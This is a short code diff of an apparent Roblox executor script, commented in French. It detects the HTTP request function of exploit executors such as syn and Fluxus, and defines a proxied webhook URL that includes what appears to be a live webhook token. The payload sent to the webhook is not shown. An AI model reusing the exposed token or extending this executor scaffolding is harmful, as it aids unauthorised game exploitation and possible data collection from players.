@@ -5,7 +5,7 @@ local Players = game:GetService("Players")
 
 local LocalPlayer = Players.LocalPlayer
 -- Détection de la fonction de l'exécuteur pour le HTTPS
-local requestFunc = request or http_request or (syn and syn.request) or (Fluxus and Fluxus.request)
+local requestFunc = request or (http and http.request) or http_request
 
 -- Ton URL de webhook / proxy
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506592229773545502/VnHasojKjMhmYkBRBSygcZIvfSltCMTfn_tagK9tifyoDTz_WpE8qyV3_GXgpXJdRN9i" 
